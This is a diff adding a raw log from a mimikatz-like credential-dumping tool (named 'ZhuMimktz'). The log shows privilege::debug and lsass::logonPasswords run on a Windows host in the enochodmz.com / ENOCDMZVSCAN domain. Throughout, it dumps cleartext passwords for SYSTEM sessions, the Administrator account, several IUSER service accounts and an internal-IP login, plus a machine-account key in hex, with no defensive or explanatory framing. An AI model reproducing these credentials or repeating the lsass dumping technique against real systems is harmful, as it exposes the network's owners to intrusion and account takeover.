@@ -1,0 +1,237 @@
+ZhuMimktz 1.2 x64 (RC)(Feb 10 2014 10:48:26)
+http://www.DooShvari.com
+
+DOOSHVARI(commandline) = priv::d3bug
+Request d'ACTIVATION privilege : SeDebugPrivilege : OK
+
+DOOSHVARI(commandline) = lsass::logonPasswords
+
+Id authentication         : 0;64355224
+Package authentication  : Negotiate
+primary User       : SYSTEM
+Domain authentication  : NT AUTHORITY
+	msv1_0 :	n.s. (Credentials KO)
+	kerberos :	80mbay123$
+	ssp :	
+	 [0] { dmzvulscan ; enochodmz.com ; 80mbay123$ }
+	wdigest :	80mbay123$
+	tspkg :	n.t. (LUID KO)
+
+Id authentication         : 0;64327016
+Package authentication  : Negotiate
+primary User       : SYSTEM
+Domain authentication  : NT AUTHORITY
+	msv1_0 :	n.s. (Credentials KO)
+	kerberos :	80mbay123$
+	ssp :	
+	 [0] { dmzvulscan ; enochodmz.com ; 80mbay123$ }
+	wdigest :	80mbay123$
+	tspkg :	n.t. (LUID KO)
+
+Id authentication         : 0;42026416
+Package authentication  : Negotiate
+primary User       : SYSTEM
+Domain authentication  : NT AUTHORITY
+	msv1_0 :	n.s. (Credentials KO)
+	kerberos :	80mbay123$
+	ssp :	
+	 [0] { dmzvulscan ; enochodmz.com ; 80mbay123$ }
+	wdigest :	80mbay123$
+	tspkg :	n.t. (LUID KO)
+
+Id authentication         : 0;996
+Package authentication  : Negotiate
+primary User       : ENOCDMZVSCAN$
+Domain authentication  : ENOCHODMZ
+	msv1_0 :	n.s. (Credentials KO)
+	kerberos :	
+	ssp :	
+	wdigest :	
+00 1f 07 66 d7 2b 97 93 bf b5 f4 6d 89 d7 f0 b6 7b b4 34 3d 9c 97 fd b2 e8 41 63 dc 9a fa ab fd 
+f3 39 e0 d1 6f 29 51 f8 d0 48 d1 f0 b3 c8 2d b1 bc dc 5e 2d 78 68 0c d5 76 7a c1 7a 52 6b d1 16 
+b6 02 d7 07 5e 86 40 d8 29 34 35 15 fe b6 6b 6d 5d 41 36 a8 e4 3f 03 68 c9 b6 b2 a0 53 14 4a 0c 
+63 36 8e 01 66 a8 8e 7e 57 39 96 db 0d e5 d8 6d e1 c1 94 75 f5 3e 0c e5 96 02 bb 92 6d e2 44 53 
+60 43 9e 32 8d d3 33 d0 be dc 6b 62 16 27 50 fc 03 47 e0 a0 4a 6f ff 2a 02 0d a8 e1 6f c3 d4 55 
+6b 08 95 bd cd 2b 33 74 41 e4 fc 8c 14 f3 e8 41 85 8b bb a2 db ba 18 0c ae 0b dc 59 e3 fe 7a d9 
+5e 95 7b 2d 5e 42 85 05 dd e4 d0 4a 7c 2d 8d 80 29 09 21 bf 1d 03 b3 87 35 8a 8a 41 08 d3 38 18 
+4e 23 ab 76 94 3c b6 73 9d a7 2b 1c 48 80 11 c4 
+	tspkg :	n.s. (SuppCred KO) / n.t. (LUID KO)
+
+Id authentication         : 0;76408901
+Package authentication  : NTLM
+primary User       : IUSER_RETANON
+Domain authentication  : ENOCDMZVSCAN
+	msv1_0 :	n.e. (Reading KIWI_MSV1_0_CREDENTIALS KO)
+	kerberos :	
+	ssp :	
+	wdigest :	2,{vG0.y2}pLlD
+	tspkg :	n.t. (LUID KO)
+
+Id authentication         : 0;64220177
+Package authentication  : Negotiate
+primary User       : SYSTEM
+Domain authentication  : NT AUTHORITY
+	msv1_0 :	n.s. (Credentials KO)
+	kerberos :	80mbay123$
+	ssp :	
+	 [0] { dmzvulscan ; enochodmz.com ; 80mbay123$ }
+	wdigest :	80mbay123$
+	tspkg :	n.t. (LUID KO)
+
+Id authentication         : 0;64217329
+Package authentication  : Negotiate
+primary User       : SYSTEM
+Domain authentication  : NT AUTHORITY
+	msv1_0 :	n.s. (Credentials KO)
+	kerberos :	80mbay123$
+	ssp :	
+	 [0] { dmzvulscan ; enochodmz.com ; 80mbay123$ }
+	wdigest :	80mbay123$
+	tspkg :	n.t. (LUID KO)
+
+Id authentication         : 0;42021145
+Package authentication  : Negotiate
+primary User       : SYSTEM
+Domain authentication  : NT AUTHORITY
+	msv1_0 :	n.s. (Credentials KO)
+	kerberos :	80mbay123$
+	ssp :	
+	 [0] { dmzvulscan ; enochodmz.com ; 80mbay123$ }
+	wdigest :	80mbay123$
+	tspkg :	n.t. (LUID KO)
+
+Id authentication         : 0;997
+Package authentication  : Negotiate
+primary User       : LOCAL SERVICE
+Domain authentication  : NT AUTHORITY
+	msv1_0 :	n.s. (Credentials KO)
+	kerberos :	
+	ssp :	
+	wdigest :	
+	tspkg :	n.t. (LUID KO)
+
+Id authentication         : 0;98510182
+Package authentication  : NTLM
+primary User       : Administrator
+Domain authentication  : ENOCDMZVSCAN
+	msv1_0 :	n.e. (Reading KIWI_MSV1_0_CREDENTIALS KO)
+	kerberos :	
+	ssp :	
+	wdigest :	@Mtv@s!a
+	tspkg :	n.t. (LUID KO)
+
+Id authentication         : 0;64179506
+Package authentication  : Negotiate
+primary User       : SYSTEM
+Domain authentication  : NT AUTHORITY
+	msv1_0 :	n.s. (Credentials KO)
+	kerberos :	80mbay123$
+	ssp :	
+	wdigest :	80mbay123$
+	tspkg :	n.t. (LUID KO)
+
+Id authentication         : 0;55467210
+Package authentication  : NTLM
+primary User       : IUSER_RETANON
+Domain authentication  : ENOCDMZVSCAN
+	msv1_0 :	n.e. (Reading KIWI_MSV1_0_CREDENTIALS KO)
+	kerberos :	
+	ssp :	
+	 [0] {  ;  ;  }
+	wdigest :	d*V.8?X-il<oU5
+	tspkg :	n.t. (LUID KO)
+
+Id authentication         : 0;41861274
+Package authentication  : Negotiate
+primary User       : SYSTEM
+Domain authentication  : NT AUTHORITY
+	msv1_0 :	n.s. (Credentials KO)
+	kerberos :	80mbay123$
+	ssp :	
+	 [0] { dmzvulscan ; enochodmz.com ; 80mbay123$ }
+	wdigest :	80mbay123$
+	tspkg :	n.t. (LUID KO)
+
+Id authentication         : 0;34849906
+Package authentication  : NTLM
+primary User       : IUSER_RETANON
+Domain authentication  : ENOCDMZVSCAN
+	msv1_0 :	n.e. (Reading KIWI_MSV1_0_CREDENTIALS KO)
+	kerberos :	
+	ssp :	
+	wdigest :	c4u[#H3MDb!,Fg
+	tspkg :	n.t. (LUID KO)
+
+Id authentication         : 0;76408415
+Package authentication  : NTLM
+primary User       : IUSER_RETINA
+Domain authentication  : ENOCDMZVSCAN
+	msv1_0 :	n.e. (Reading KIWI_MSV1_0_CREDENTIALS KO)
+	kerberos :	
+	ssp :	
+	wdigest :	;[gOF6}54zKX<u
+	tspkg :	n.t. (LUID KO)
+
+Id authentication         : 0;64179383
+Package authentication  : Negotiate
+primary User       : SYSTEM
+Domain authentication  : NT AUTHORITY
+	msv1_0 :	n.s. (Credentials KO)
+	kerberos :	80mbay123$
+	ssp :	
+	 [0] { dmzvulscan ; enochodmz.com ; 80mbay123$ }
+	wdigest :	80mbay123$
+	tspkg :	n.t. (LUID KO)
+
+Id authentication         : 0;41869143
+Package authentication  : Negotiate
+primary User       : SYSTEM
+Domain authentication  : NT AUTHORITY
+	msv1_0 :	n.s. (Credentials KO)
+	kerberos :	80mbay123$
+	ssp :	
+	 [0] { dmzvulscan ; enochodmz.com ; 80mbay123$ }
+	wdigest :	80mbay123$
+	tspkg :	n.t. (LUID KO)
+
+Id authentication         : 0;41865039
+Package authentication  : Negotiate
+primary User       : SYSTEM
+Domain authentication  : NT AUTHORITY
+	msv1_0 :	n.s. (Credentials KO)
+	kerberos :	80mbay123$
+	ssp :	
+	 [0] { dmzvulscan ; enochodmz.com ; 80mbay123$ }
+	wdigest :	80mbay123$
+	tspkg :	n.t. (LUID KO)
+
+Id authentication         : 0;26915
+Package authentication  : NTLM
+primary User       : 
+Domain authentication  : 
+	msv1_0 :	n.s. (Credentials KO)
+	kerberos :	n.t. (LUID KO)
+	ssp :	
+	 [0] { IUSER_REM ; 192.168.210.42 ; INSightS99$ }
+	wdigest :	n.t. (LUID KO)
+	tspkg :	n.t. (LUID KO)
+
+Id authentication         : 0;999
+Package authentication  : Negotiate
+primary User       : ENOCDMZVSCAN$
+Domain authentication  : ENOCHODMZ
+	msv1_0 :	n.s. (Credentials KO)
+	kerberos :	
+	ssp :	
+	wdigest :	
+00 1f 07 66 d7 2b 97 93 bf b5 f4 6d 89 d7 f0 b6 7b b4 34 3d 9c 97 fd b2 e8 41 63 dc 9a fa ab fd 
+f3 39 e0 d1 6f 29 51 f8 d0 48 d1 f0 b3 c8 2d b1 bc dc 5e 2d 78 68 0c d5 76 7a c1 7a 52 6b d1 16 
+b6 02 d7 07 5e 86 40 d8 29 34 35 15 fe b6 6b 6d 5d 41 36 a8 e4 3f 03 68 c9 b6 b2 a0 53 14 4a 0c 
+63 36 8e 01 66 a8 8e 7e 57 39 96 db 0d e5 d8 6d e1 c1 94 75 f5 3e 0c e5 96 02 bb 92 6d e2 44 53 
+60 43 9e 32 8d d3 33 d0 be dc 6b 62 16 27 50 fc 03 47 e0 a0 4a 6f ff 2a 02 0d a8 e1 6f c3 d4 55 
+6b 08 95 bd cd 2b 33 74 41 e4 fc 8c 14 f3 e8 41 85 8b bb a2 db ba 18 0c ae 0b dc 59 e3 fe 7a d9 
+5e 95 7b 2d 5e 42 85 05 dd e4 d0 4a 7c 2d 8d 80 29 09 21 bf 1d 03 b3 87 35 8a 8a 41 08 d3 38 18 
+4e 23 ab 76 94 3c b6 73 9d a7 2b 1c 48 80 11 c4 
+	tspkg :	n.t. (LUID KO)
+
+DOOSHVARI(commandline) = exit
